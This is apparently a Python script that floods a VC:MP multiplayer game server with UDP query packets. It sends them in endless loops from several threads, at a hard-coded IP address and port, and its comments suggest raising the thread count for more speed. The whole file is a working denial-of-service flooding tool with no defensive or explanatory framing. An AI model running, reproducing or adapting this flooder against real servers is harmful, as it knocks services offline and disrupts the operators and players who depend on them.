import socket
import threading

def send_packet(ip, port, opcode):
    """Sends packets to the VC:MP server as fast as possible."""
    query_packet = b"VCMP" + socket.inet_aton(ip) + port.to_bytes(2, 'big') + bytes([ord(opcode)])
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            sock.sendto(query_packet, (ip, port))
    except KeyboardInterrupt:
        print("\nStopped by user (Ctrl+C).")
    except Exception as e:
        print("Error:", e)
    finally:
        sock.close()

def start_threads(ip, port, opcode, num_threads=10):
    """Launches multiple threads for faster packet sending."""
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packet, args=(ip, port, opcode), daemon=True)
        thread.start()
        threads.append(thread)

    try:
        while True:  # Keep the main thread alive
            pass
    except KeyboardInterrupt:
        print("\nStopping all threads.")

# **Start sending packets**
ip = "78.46.65.243"
port = 7582
opcode = 'i'  # Change to 'c' or 'p' if needed
num_threads = 2  # Increase for more speed

start_threads(ip, port, opcode, num_threads)
